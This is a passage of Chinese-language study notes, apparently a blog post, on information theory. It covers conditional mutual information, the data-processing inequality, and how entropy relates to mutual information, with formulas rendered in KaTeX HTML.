xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">∣</mi><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(b|a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mord">∣</span><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span> 的下凸函数。</p></li><li><p>信息传递递减。假设 X Z 互相独立，经过 Y 传递信息，那么</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Z</mi><mo stretchy="false">)</mo><mo>≤</mo><mi>I</mi><mo stretchy="false">(</mo><mi>Y</mi><mo separator="true">;</mo><mi>Z</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Z</mi><mo stretchy="false">)</mo><mo>≤</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mi>Z</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo fence="true">)</mo></mrow><mo>−</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mi>Z</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">  \begin{aligned}  &amp;I(X;Z)\le I(Y;Z)\\  &amp;I(X;Z)\le I(X;Y)\\  &amp;I\left( X;YZ \right) =H\left( X \right) -H\left( X|YZ \right)  \end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5em;vertical-align:-2em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.5em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-3em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-1.5em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span></span></span></span></span></p></li></ol><h2 id="条件互信息量">条件互信息量</h2><p>特别地，教材里还提到了<strong>条件互信息量</strong>，信源 X 和信宿 Y 都知道一个条件 c，那么定义在条件 c 下的 a b 的互信息量为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">;</mo><mi>b</mi><mi mathvariant="normal">∣</mi><mi>c</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>I</mi><mrow><mo fence="true">(</mo><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">;</mo><mi>b</mi><mo fence="true">)</mo></mrow><mi mathvariant="normal">∣</mi><mi>c</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>log</mi><mo>⁡</mo><mfrac><mrow><mi>p</mi><mrow><mo fence="true">(</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>b</mi><mi>c</mi><mo fence="true">)</mo></mrow></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>c</mi><mo fence="true">)</mo></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">I\left( a;b|c \right) =I\left( \left( a;b \right) |c \right) =\log \frac{p\left( a|bc \right)}{p\left( a|c \right)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mord">∣</span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">b</span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>这里要稍微注意的是，条件互信息量的表示，容易有歧义。c 是共有的条件。特别的，如果把 b c 所在的信源作为一个整体，a 所在信源作为信宿，有：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">;</mo><mi>b</mi><mi>c</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>I</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">;</mo><mi>c</mi><mo fence="true">)</mo></mrow><mo>+</mo><mi>I</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">;</mo><mi>b</mi><mi mathvariant="normal">∣</mi><mi>c</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>I</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">;</mo><mi>b</mi><mo fence="true">)</mo></mrow><mo>+</mo><mi>I</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">;</mo><mi>c</mi><mi mathvariant="normal">∣</mi><mi>b</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">I\left( a;bc \right) =I\left( a;c \right) +I\left( a;b|c \right) =I\left( a;b \right) +I\left( a;c|b \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mord">∣</span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mord">∣</span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>这也比较直观，从 b c 传递给 a 的信息，来自于从 c 传递给 a 的信息和 a b 已知 c 的情况下，b 给 a 传递的信息。</p><h2 id="平均互信息量的三个视角">平均互信息量的三个视角</h2><p>从信息传递的角度看，可以分别从信源 X 的角度、信宿 Y 的调度和通信系统整体的角度，看待平均互信息量（传输的信息量）和信源熵（信源传输信息的能力）。</p><p><strong>从信源 X：</strong></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>Y</mi><mo separator="true">;</mo><mi>X</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>Y</mi><mo fence="true">)</mo></mrow><mo>−</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>Y</mi><mi mathvariant="normal">∣</mi><mi>X</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">I\left( Y;X \right) =H\left( Y \right) -H\left( Y|X \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>这表示 X 发送信息后，从 X 观察 Y，Y 剩下的不确定度，也就是信息熵。</p><p><strong>从信宿 Y</strong>：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo fence="true">)</mo></mrow><mo>−</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">I\left( X;Y \right) =H\left( X \right) -H\left( X|Y \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>这表示 Y 接收信息后，从 Y 观察 X，X 剩下的不确定度，也就是信息熵。</p><p><strong>从通信系统：</strong></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo fence="true">)</mo></mrow><mo>+</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>Y</mi><mo fence="true">)</mo></mrow><mo>−</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mi>Y</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">I\left( X;Y \right) =H\left( X \right)+ H\left( Y \right)-H\left( XY \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>这表示原本传递信息之前，X 和 Y 是独立的，提供的信息熵为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo fence="true">)</mo></mrow><mo>+</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>Y</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">H\left( X \right)+ H\left( Y \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>。但是当 X 和 Y 通信后，X Y 作为整体所提供的信息熵就变成了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mi>Y</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">H\left( XY \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>，二者之差就是传递的信息量。</p><h2 id="信源熵互信息量的关系">信源熵互信息量的关系</h2><p>下面的图中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(X;Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span> 表示 X Y 重叠部分，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(XY)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span> 表示两个圆的组合，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">/</mi><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(X/Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span> 表示圆 X 挖去了圆 Y 的部分。</p><img src="http://cdn.blog-blockchain.xyz/202305272140486.png" alt="image-20230527214039394" style="zoom:50%;" /><img src="http://cdn.blog-blockchain.xyz/202305272141068.png" alt="image-20230527214102898" style="zoom:50%;" /><h2 id="单符号离散信道容量">单符号离散信道容量</h2><p>仍然假设输入$X\in { a_1,a_2,\cdots a_n } $，输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi><mo>∈</mo><mo stretchy="false">{</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>b</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><msub><mi>b</mi><mi>m</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Y \in\{b_1, b_2, \cdots b_m\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord 